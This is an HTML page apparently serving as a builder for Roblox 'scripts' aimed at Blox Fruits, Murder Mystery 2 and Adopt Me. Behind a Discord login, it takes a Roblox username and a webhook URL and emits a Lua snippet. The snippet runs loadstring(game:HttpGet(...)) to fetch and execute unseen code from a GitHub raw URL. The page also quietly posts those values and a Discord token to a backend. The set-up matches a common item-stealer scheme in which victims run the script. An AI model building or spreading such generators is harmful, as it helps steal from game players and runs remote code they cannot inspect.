<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Script Generator</title>
    <style>
        body { background: linear-gradient(45deg, #0f0c29, #302b63, #24243e); color: white; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
        button { background: #ff0080; padding: 10px 20px; border-radius: 8px; cursor: pointer; transition: 0.3s; }
        button:hover { background: #ff0055; transform: scale(1.1); }
        .auth-container { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 0, 0, 0.5); display: flex; justify-content: center; align-items: center; }
        .auth-box { background: rgba(255, 255, 255, 0.2); padding: 20px; border-radius: 8px; backdrop-filter: blur(5px); }
    </style>
</head>
<body>
    <h1>Script Generator</h1>
    <div id="auth-container" class="auth-container">
        <div class="auth-box">
            <h2>Login with Discord</h2>
            <button id="auth-btn">Authenticate with Discord</button>
        </div>
    </div>
    
    <div class="container">
        <button onclick="openPopup('Blox Fruits')">Blox Fruits</button>
        <button onclick="openPopup('Murder Mystery 2')">Murder Mystery 2</button>
        <button onclick="openPopup('Adopt Me')">Adopt Me</button>
    </div>
    
    <div id="popup" class="popup" style="display: none;">
        <h2 id="game-title">Enter Details</h2>
        <input type="text" id="username" placeholder="Roblox Username">
        <input type="text" id="webhook" placeholder="Webhook URL">
        <button onclick="generateScript()">Generate Script</button>
        <button onclick="closePopup()">Close</button>
    </div>

    <script>
        let currentGame = '';
        let authToken = ''; // Store authentication token for Discord

        // Show the auth modal
        document.getElementById('auth-btn').onclick = function() {
            window.location.href = 'https://your-backend-url.com/auth'; // Your backend to handle OAuth2
        };

        function openPopup(game) { 
            if (!authToken) {
                alert("Please authenticate first.");
                return;
            }
            currentGame = game; 
            document.getElementById('popup').style.display = 'block'; 
        }

        function closePopup() { 
            document.getElementById('popup').style.display = 'none'; 
        }

        function generateScript() {
            let username = document.getElementById('username').value;
            let webhook = document.getElementById('webhook').value;
            if (username && webhook) {
                let url = currentGame === 'Blox Fruits' ? 'Bloxfruits' : (currentGame === 'Murder Mystery 2' ? 'Void' : 'AdoptMe');
                let script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/${url}'))()`;
                alert(script);

                // Send data to backend to log the user and webhook
                fetch('https://your-backend-url.com/log', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ 
                        username: username, 
                        webhook: webhook, 
                        discordUser: authToken 
                    })
                });
            } else { alert("Please fill in both fields!"); }
        }
    </script>
</body>
</html>
